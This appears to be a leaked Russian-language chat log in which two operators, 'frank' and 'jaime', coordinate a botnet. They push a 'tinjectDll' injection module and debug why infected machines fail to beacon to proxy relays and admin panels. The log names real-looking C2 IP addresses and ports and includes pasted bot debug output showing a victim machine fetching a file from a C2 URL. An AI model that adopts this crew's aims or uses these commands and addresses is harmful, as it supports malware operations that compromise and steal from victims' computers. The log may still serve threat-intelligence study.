[16.12.21 17:03:32] frank:		Привет.
[16.12.21 17:07:39] jaime:		Привет!
[16.12.21 17:07:48] jaime:		Модуль только заливаем
[16.12.21 17:07:59] jaime:		Ждали Цезаря
[16.12.21 17:08:08] jaime:		Заливаем через Адама
[16.12.21 17:11:11] frank:		Поняно всё
[16.12.21 17:11:13] frank:		Ок.
[16.12.21 17:31:09] frank:		Запускать на 62?
tinjectDll start?
[16.12.21 17:36:44] frank:		Адам ответил не актуально.
[16.12.21 17:37:03] jaime:		Что это значит?
[16.12.21 17:37:31] jaime:		tinjectDll64 может так?
[16.12.21 17:47:29] frank:		Ок попробую так.
[16.12.21 17:47:43] jaime:		tinjectDll start
[16.12.21 17:47:55] jaime:		Адам сказал
[16.12.21 17:48:04] frank:		Хорошо.
[16.12.21 19:05:49] jaime:		Как там помощь нужна?
[16.12.21 19:07:00] frank:		Пока нет. Хаммер завтра запустит все проверит, я пока что в процессе доработки кода
[23.12.21 15:43:10] jaime:		Привет!
[23.12.21 15:44:01] frank:		Привет
[23.12.21 15:44:02] jaime:		Там летят к тебе данные с Content-Encoding: gzip они естественно двоичные
[23.12.21 15:44:07] jaime:		Привет!
[23.12.21 15:44:29] frank:		Ок, они не доходят?
[23.12.21 15:44:31] frank:		Или как?
[23.12.21 15:44:59] frank:		Я пока сделал чтобы писало и то и то..
[23.12.21 15:45:07] frank:		То есть и в б64 и обычные
[23.12.21 15:45:31] jaime:		да передаем и то и то.
[23.12.21 15:45:35] frank:		Вот удмаю как бы проверить отдельно.. Попросил хаммера пока запустить просто отстук, но не проходит.
[23.12.21 15:45:48] frank:		Чтобы убедится что вообще работает..
[23.12.21 15:46:09] jaime:		Причем судя по логам есть /1/ приходит
[23.12.21 15:46:17] frank:		Я вижу что данные которые я вручную шлю идут.
[23.12.21 15:46:35] frank:		Вот понять бы что от бота старый формат доходит.
[23.12.21 15:47:33] jaime:		Пока как я понял Хаммера вообще ничего не приходит
[23.12.21 15:48:02] jaime:		У него было подозрение на вот эти двоичные данные
[23.12.21 15:48:41] jaime:		Но я стал смотреть это нормально, уж не знаю что с ними делать, но данные  правильные
[23.12.21 15:49:15] frank:		Ок, то есть сейчас не идет из за двоичных именно?
[23.12.21 15:49:41] jaime:		Походу вообще ничего не идет
[23.12.21 15:50:03] frank:		хз..
[23.12.21 15:50:10] frank:		я вижу что что-то идет
[23.12.21 15:50:16] frank:		Может не то что нужно, конечно.
[23.12.21 15:50:20] jaime:		но прием есть
[23.12.21 15:51:11] jaime:		Блин там даже dns over https лезет
[23.12.21 15:51:24] jaime:		Очень нужно
[27.12.21 14:49:17] frank:		Привет.
[27.12.21 14:49:26] jaime:		Привет!
[27.12.21 14:51:01] frank:		Есть вот такой вопрос.
Хаммер пробует у себя запускать бота на 7ке, у него он не стучит.
Вопрос, сможешь ли ты проверить есть ли http запрос на прокладку с бота на этой системе, корректно ли он работает
[27.12.21 14:51:44] jaime:		Можно wiresharkом посмотреть
[27.12.21 14:51:54] jaime:		Можно туда поставить?
[27.12.21 14:52:14] frank:		А у вас одна машина?
[27.12.21 14:52:49] jaime:		Сейчас с Хаммером договоримся! :)
[27.12.21 14:53:42] jaime:		По какому порту бот стучит на прокладку?
[27.12.21 14:54:49] frank:		8082
[27.12.21 14:55:01] frank:		А
[27.12.21 14:55:20] frank:		Точно не скажу, не знаю настройки сборки.
[27.12.21 14:55:42] frank:		Попробуй 443 или 445 посмотреть
[27.12.21 14:55:54] frank:		8081 бывает
[27.12.21 14:56:07] jaime:		Понял посмотрим!
[27.12.21 15:57:03] jaime:		Вижу что идет обмен с 2.16.192.110 по 443 порту
[27.12.21 16:45:13] frank:		Угу.
[27.12.21 16:45:52] jaime:		Очень странный обмен я бы сказал
[27.12.21 16:47:04] frank:		Что за обмен?
[27.12.21 16:47:11] frank:		Там сейчас часть проксей отпала.
[27.12.21 16:47:19] frank:		Может из за этого все эти ошибки.
[27.12.21 16:47:31] frank:		ConnectGet(),185: LastErrorCode 183
12/27/2021 11:12:14 AM AdmGetFile2(),542: ConnectGet() error 6(10035)
12/27/2021 11:12:17 AM cmd /5/file/ error
12/27/2021 11:12:22 AM 00 65.152.201.203:443
12/27/2021 11:12:22 AM AdmGetFile2(),531: url = https://65.152.201.203:443/nn0001/USER-PC_W617600.f856a686256fc3a41bb824a540163cd6/5/file/
12/27/2021 11:12:43 AM ConnectGet(),116: isSend =0 LastErrorCode 12029
[27.12.21 16:47:37] frank:		Такой?
[27.12.21 16:47:51] jaime:		Нет я в wireshark смотрю
[27.12.21 16:47:56] frank:		аа
[27.12.21 16:48:11] jaime:		Мне только шифрованный tсp виден
[27.12.21 16:48:41] jaime:		Просто все пакеты идет от 2.16.192.110 строго по 1514 байт
[27.12.21 16:49:06] jaime:		От этого бота только ACK идут
[27.12.21 16:50:00] jaime:		Как будто tls не договорился и не поднимается поверх tcp
[27.12.21 16:50:46] frank:		Я запишу это ,но сначало неда дождусь
[27.12.21 16:51:02] frank:		Не ясно это из за того что тупо конфига нет.
[27.12.21 16:51:09] frank:		Или ещё из за чего-то
[27.12.21 16:51:36] jaime:		тут бы лог бота смотреть, но что то его не найду
[27.12.21 16:51:55] frank:		А есть ид у него?
[27.12.21 16:52:10] frank:		Давай гляну что то идет на вход хотя бы одной из админок..
[27.12.21 16:52:54] jaime:		Есть утренний лог
[27.12.21 16:53:09] jaime:		USER-PC_W617600.f856a686256fc3a41bb824a540163cd6
[27.12.21 16:53:16] jaime:		Там вот такой ID
[10.02.22 16:54:32] frank:		Привет
[10.02.22 17:01:25] jaime:		Привет!
[10.02.22 17:01:55] jaime:		Мне бы IP куда слать лог пост
[10.02.22 17:02:14] frank:		Нужны ипы прокладок аука?
[10.02.22 17:02:23] frank:		Сейчас их нет, получается у тебя?
[10.02.22 17:02:33] jaime:		да одной достаточно
[10.02.22 17:02:54] jaime:		195.39.233.29 вот такой есть
[10.02.22 17:04:06] frank:		Понятно, хорошо, уточню и скину. Скорее всего уже завтра.
